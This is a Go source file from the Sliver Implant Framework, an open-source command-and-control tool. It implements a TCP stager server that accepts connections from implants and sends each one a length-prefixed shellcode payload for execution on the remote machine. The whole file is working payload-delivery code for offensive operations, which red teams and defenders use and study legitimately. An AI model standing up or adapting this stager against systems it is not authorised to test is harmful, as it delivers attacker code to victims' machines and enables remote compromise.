package c2

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"encoding/binary"
	"net"
	"strings"

	"github.com/sirupsen/logrus"

	"github.com/bishopfox/sliver/server/log"
)

var (
	tcpLog = log.NamedLogger("c2", "tcp-stager")
)

// ServeStagerConnections - Given a listener, accept and handle incoming connections that are requesting
// a stage payload. This function is strictly the same than ServeListenerConnections, except that we
// just write the payload to the connection and exit.
func ServeStagerConnections(log *logrus.Entry, ln net.Listener, payload []byte) {

	// Setup the logger
	log = log.WithField("component", "handler")

	// The C2 root listen function might not have passed any listener,
	// because the protocol doesn't use one, like HTTP or DNS
	if ln == nil {
		return
	}

	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Debugf("Accept failed: %v", err)
			if errType, ok := err.(*net.OpError); ok && errType.Op == "accept" {
				break
			}
			// Added to handle closed listeners from the Comm system.
			if err == net.ErrClosed {
				break
			}
			// Also added for closed listeners from the Comm system
			if errType, ok := err.(*net.OpError); ok && strings.Contains(errType.Error(), "closed listener") {
				break
			}
			continue
		}

		// For some reason when closing the listener
		// from the Comm system returns a nil connection...
		if conn == nil {
			log.Debugf("Accepted a nil conn: %v", err)
			break
		}

		// Set up the RPC layer around the connection
		go handleStagerConnection(log, conn, payload)

	}
}

// handleStagerConnection - Writes a stage payload to a connection, for execution on the remote side.
func handleStagerConnection(log *logrus.Entry, conn net.Conn, data []byte) {
	// Send shellcode size
	dataSize := uint32(len(data))
	lenBuf := make([]byte, 4)
	binary.LittleEndian.PutUint32(lenBuf, dataSize)
	log.Infof("Shellcode size: %d", dataSize)
	final := append(lenBuf, data...)
	log.Infof("Sending shellcode (%d)", len(final))
	// Send shellcode
	n, err := conn.Write(final)
	if err != nil {
		log.Errorf("Writing stage to connection failed: %s", err)
	} else {
		log.Debugf("Successfully written (%d bytes) to connection", n)
	}
	// Closing connection
	log.Debugf("Closing connection")
	err = conn.Close()
	if err != nil {
		log.Debugf("Error closing connection: %s", err)
	}
}
